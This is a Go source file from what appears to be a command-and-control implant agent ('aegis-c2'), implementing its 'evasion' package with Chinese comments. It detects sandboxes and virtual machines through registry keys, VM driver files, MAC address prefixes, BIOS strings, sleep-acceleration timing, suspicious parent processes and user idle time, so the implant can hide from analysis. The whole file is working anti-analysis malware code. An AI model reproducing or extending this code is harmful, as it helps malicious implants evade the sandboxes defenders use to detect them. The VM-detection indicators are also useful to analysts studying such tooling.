//go:build windows && amd64

package evasion

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/aegis-c2/aegis/agent/winutil"
)

var (
	modKernel32 = syscall.NewLazyDLL("kernel32.dll")
	modAdvapi32 = syscall.NewLazyDLL("advapi32.dll")
	modUser32   = syscall.NewLazyDLL("user32.dll")

	procGetTickCount     = modKernel32.NewProc("GetTickCount")
	procSleep            = modKernel32.NewProc("Sleep")
	procGetLastInputInfo = modUser32.NewProc("GetLastInputInfo")

	procRegOpenKeyExW    = modAdvapi32.NewProc("RegOpenKeyExW")
	procRegQueryValueExW = modAdvapi32.NewProc("RegQueryValueExW")
	procRegCloseKey      = modAdvapi32.NewProc("RegCloseKey")

	procGetCurrentProcessId = modKernel32.NewProc("GetCurrentProcessId")

	procGetAdaptersInfo = syscall.NewLazyDLL("iphlpapi.dll").NewProc("GetAdaptersInfo")
)

const (
	KEY_READ = 0x20019
)

type LASTINPUTINFO struct {
	cbSize uint32
	dwTime uint32
}

type IPAdapterInfo struct {
	ComboIndex      uint32
	AdapterName     [260]byte
	Description     [132]byte
	AddressLength   uint32
	Address         [8]byte
	Index           uint32
	Type            uint32
	DhcpEnabled     uint32
	CurrentIPAddress uintptr
	IPAddressList   uintptr
	GatewayList     uintptr
	DhcpServer      uintptr
	HaveWins        bool
	PrimaryWinsServer uintptr
	SecondaryWinsServer uintptr
	LeaseObtained   int64
	LeaseExpires    int64
	Next            *IPAdapterInfo
}

// CheckSandbox 综合检测是否在沙箱/分析环境中运行。
// 返回 (是否可疑, 原因列表)。
// 检测项目：注册表、文件系统、MAC 地址、CPUID、睡眠加速、父进程、用户交互。
func CheckSandbox() (bool, []string) {
	var reasons []string

	// 1. 注册表检测
	if vm, reason := CheckRegistryVM(); vm {
		reasons = append(reasons, reason)
	}

	// 2. 文件系统检测
	if vm, reason := CheckFilesystemVM(); vm {
		reasons = append(reasons, reason)
	}

	// 3. MAC 地址检测
	if vm, reason := CheckMACAddress(); vm {
		reasons = append(reasons, reason)
	}

	// 4. CPUID 虚拟机检测
	if vm, reason := CheckCPUIDHypervisor(); vm {
		reasons = append(reasons, reason)
	}

	// 5. 睡眠加速检测
	if CheckSleepAcceleration() {
		reasons = append(reasons, "sleep acceleration detected — sandbox may be speeding up time")
	}

	// 6. 父进程检测
	if suspicious, reason := CheckParentProcess(); suspicious {
		reasons = append(reasons, reason)
	}

	// 7. 用户交互检测
	if !CheckUserInteraction() {
		reasons = append(reasons, "no user interaction in the last 10 minutes — possible sandbox")
	}

	return len(reasons) > 0, reasons
}

// CheckVM 检测是否在虚拟机中运行（VMware/VirtualBox）。
func CheckVM() (bool, string) {
	// 注册表检测
	if vm, reason := CheckRegistryVM(); vm {
		return true, reason
	}

	// 文件系统检测
	if vm, reason := CheckFilesystemVM(); vm {
		return true, reason
	}

	// MAC 地址检测
	if vm, reason := CheckMACAddress(); vm {
		return true, reason
	}

	// CPUID 检测
	if vm, reason := CheckCPUIDHypervisor(); vm {
		return true, reason
	}

	return false, ""
}

// === 1. 注册表检测 ===

// CheckRegistryVM 检查注册表中的虚拟机标识。
func CheckRegistryVM() (bool, string) {
	// VMware
	keys := []string{
		`SOFTWARE\VMware, Inc.\VMware Tools`,
	}
	for _, keyPath := range keys {
		if checkRegistryKeyExists(keyPath) {
			return true, fmt.Sprintf("registry key found: HKLM\\%s (VMware)", keyPath)
		}
	}

	// VirtualBox
	vboxKeys := []string{
		`SOFTWARE\Oracle\VirtualBox Guest Additions`,
	}
	for _, keyPath := range vboxKeys {
		if checkRegistryKeyExists(keyPath) {
			return true, fmt.Sprintf("registry key found: HKLM\\%s (VirtualBox)", keyPath)
		}
	}

	// 磁盘标识检测
	diskID, _ := readRegistryString(
		`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0`,
		"Identifier")
	if diskID != "" {
		upper := strings.ToUpper(diskID)
		if strings.Contains(upper, "VMWARE") {
			return true, fmt.Sprintf("disk identifier contains VMWARE: %s", diskID)
		}
		if strings.Contains(upper, "VBOX") {
			return true, fmt.Sprintf("disk identifier contains VBOX: %s", diskID)
		}
	}

	return false, ""
}

func checkRegistryKeyExists(keyPath string) bool {
	keyUTF16, err := syscall.UTF16PtrFromString(keyPath)
	if err != nil {
		return false
	}
	var hKey syscall.Handle
	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(syscall.HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(keyUTF16)),
		0,
		uintptr(KEY_READ),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret == 0 {
		procRegCloseKey.Call(uintptr(hKey))
		return true
	}
	return false
}

func readRegistryString(keyPath, valueName string) (string, error) {
	keyUTF16, err := syscall.UTF16PtrFromString(keyPath)
	if err != nil {
		return "", err
	}
	var hKey syscall.Handle
	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(syscall.HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(keyUTF16)),
		0,
		uintptr(KEY_READ),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return "", fmt.Errorf("RegOpenKeyEx failed: %d", ret)
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valueUTF16, _ := syscall.UTF16PtrFromString(valueName)
	buf := make([]byte, 1024)
	bufSize := uintptr(len(buf))
	var valType uint32

	ret, _, _ = procRegQueryValueExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueUTF16)),
		0,
		uintptr(unsafe.Pointer(&valType)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufSize)),
	)
	if ret != 0 {
		return "", fmt.Errorf("RegQueryValueEx failed: %d", ret)
	}

	// UTF-16LE 转 string
	var runes []rune
	for i := 0; i < int(bufSize)-1; i += 2 {
		codePoint := uint16(buf[i]) | uint16(buf[i+1])<<8
		if codePoint == 0 {
			break
		}
		runes = append(runes, rune(codePoint))
	}
	return string(runes), nil
}

// === 2. 文件系统检测 ===

// CheckFilesystemVM 检查是否存在虚拟机特有的驱动文件。
func CheckFilesystemVM() (bool, string) {
	vmFiles := map[string]string{
		`C:\Windows\System32\drivers\vmmouse.sys`:   "VMware (vmmouse.sys)",
		`C:\Windows\System32\drivers\VBoxMouse.sys`: "VirtualBox (VBoxMouse.sys)",
		`C:\Windows\System32\drivers\VBoxGuest.sys`: "VirtualBox (VBoxGuest.sys)",
		`C:\Windows\System32\drivers\VBoxSF.sys`:    "VirtualBox (VBoxSF.sys)",
		`C:\Windows\System32\drivers\VBoxVideo.sys`: "VirtualBox (VBoxVideo.sys)",
		`C:\Windows\System32\drivers\vm3dmp.sys`:    "VMware (vm3dmp.sys)",
		`C:\Windows\System32\drivers\vmci.sys`:      "VMware (vmci.sys)",
		`C:\Windows\System32\drivers\vmhgfs.sys`:    "VMware (vmhgfs.sys)",
	}

	for path, desc := range vmFiles {
		if _, err := os.Stat(filepath.FromSlash(path)); err == nil {
			return true, fmt.Sprintf("file exists: %s (%s)", path, desc)
		}
	}

	return false, ""
}

// === 3. MAC 地址检测 ===

// CheckMACAddress 检查网卡 MAC 地址前缀是否匹配已知虚拟机。
func CheckMACAddress() (bool, string) {
	// VMware: 00:0C:29, 00:50:56, 00:05:69
	// VirtualBox: 08:00:27
	vmMACs := []string{
		"00:0c:29",
		"00:50:56",
		"00:05:69",
		"08:00:27",
	}

	bufSize := uint32(15000)
	buf := make([]byte, bufSize)
	ret, _, _ := procGetAdaptersInfo.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufSize)),
	)
	if ret != 0 {
		return false, ""
	}

	// 遍历适配器链表
	adapter := (*IPAdapterInfo)(unsafe.Pointer(&buf[0]))
	for adapter != nil {
		if adapter.AddressLength == 6 {
			mac := hex.EncodeToString(adapter.Address[:6])
			macFormatted := mac[:8] // first 3 bytes with colons
			for _, vmMac := range vmMACs {
				if strings.HasPrefix(macFormatted, strings.ReplaceAll(vmMac, ":", "")) {
					return true, fmt.Sprintf("VM MAC address detected: %s", mac)
				}
			}
		}
		adapter = adapter.Next
	}

	return false, ""
}

// === 4. CPUID 虚拟机检测 ===

// CheckCPUIDHypervisor 检查 CPUID eax=1 时 ecx 的 hypervisor 位 (bit 31)。
func CheckCPUIDHypervisor() (bool, string) {
	// CPUID with eax=1 returns feature info in ecx.
	// Bit 31 of ecx = 1 means hypervisor is present.
	// This must be done via CGO inline asm or a C function.

	return checkCPUIDViaCGO()
}

func checkCPUIDViaCGO() (bool, string) {
	// Use runtime package or CGO to execute CPUID.
	// In pure Go, we can't execute CPUID directly on x64.
	// We'll check via WMI as a fallback.
	//
	// Actually, on Windows, we can check via:
	// HKLM\HARDWARE\DESCRIPTION\System\SystemBiosVersion
	// or HKLM\HARDWARE\DESCRIPTION\System\VideoBiosVersion
	biosVersion, _ := readRegistryString(
		`HARDWARE\DESCRIPTION\System`,
		"SystemBiosVersion")
	if biosVersion != "" {
		upper := strings.ToUpper(biosVersion)
		if strings.Contains(upper, "VMWARE") {
			return true, fmt.Sprintf("SystemBiosVersion contains VMWARE: %s", biosVersion)
		}
		if strings.Contains(upper, "VBOX") {
			return true, fmt.Sprintf("SystemBiosVersion contains VBOX: %s", biosVersion)
		}
	}

	return false, ""
}

// === 5. 睡眠加速检测 ===

// CheckSleepAcceleration 检测沙箱是否加速了 Sleep() 调用。
func CheckSleepAcceleration() bool {
	testSleepMs := 3000
	thresholdMs := 2500

	// GetTickCount before
	start, _, _ := procGetTickCount.Call()

	// Sleep
	procSleep.Call(uintptr(testSleepMs))

	// GetTickCount after
	end, _, _ := procGetTickCount.Call()

	// Mask to 32 bits — GetTickCount returns DWORD, high bits may be garbage
	elapsedMs := uint64(uint32(end)) - uint64(uint32(start))
	return elapsedMs < uint64(thresholdMs)
}

// === 6. 父进程检测 ===

// CheckParentProcess 检查父进程是否可疑。
// 正常情况：explorer.exe（用户双击启动）
// 可疑情况：cmd.exe, powershell.exe, cscript.exe, wscript.exe, mshta.exe
func CheckParentProcess() (bool, string) {
	currentPID, _, _ := procGetCurrentProcessId.Call()
	if currentPID == 0 {
		return false, ""
	}

	parentPID := getParentPID(uint32(currentPID))
	if parentPID == 0 {
		return false, ""
	}

	parentName := getProcessName(parentPID)
	if parentName == "" {
		return false, ""
	}

	suspiciousParents := []string{
		"cmd.exe", "powershell.exe", "pwsh.exe",
		"cscript.exe", "wscript.exe", "mshta.exe",
		"wmic.exe", "rundll32.exe", "regsvr32.exe",
	}

	lower := strings.ToLower(parentName)
	for _, susp := range suspiciousParents {
		if lower == susp {
			return true, fmt.Sprintf("suspicious parent process: %s (pid=%d)", parentName, parentPID)
		}
	}

	return false, ""
}

func getParentPID(pid uint32) uint32 {
	ppid, err := winutil.GetParentPID(pid)
	if err != nil {
		return 0
	}
	return ppid
}

func getProcessName(pid uint32) string {
	name, err := winutil.GetProcessName(pid)
	if err != nil {
		return ""
	}
	return name
}

// === 7. 用户交互检测 ===

// CheckUserInteraction 检查最近是否有用户输入。
// 沙箱通常没有真实的用户交互。
func CheckUserInteraction() bool {
	var lii LASTINPUTINFO
	lii.cbSize = uint32(unsafe.Sizeof(lii))

	ret, _, _ := procGetLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
	if ret == 0 {
		return true // assume interactive if we can't check
	}

	now, _, _ := procGetTickCount.Call()
	// Mask to 32 bits — GetTickCount returns DWORD, high bits may be garbage
	idleTimeMs := uint64(uint32(now)) - uint64(lii.dwTime)

	// 如果空闲时间超过 10 分钟，认为是沙箱
	return idleTimeMs < 600000
}
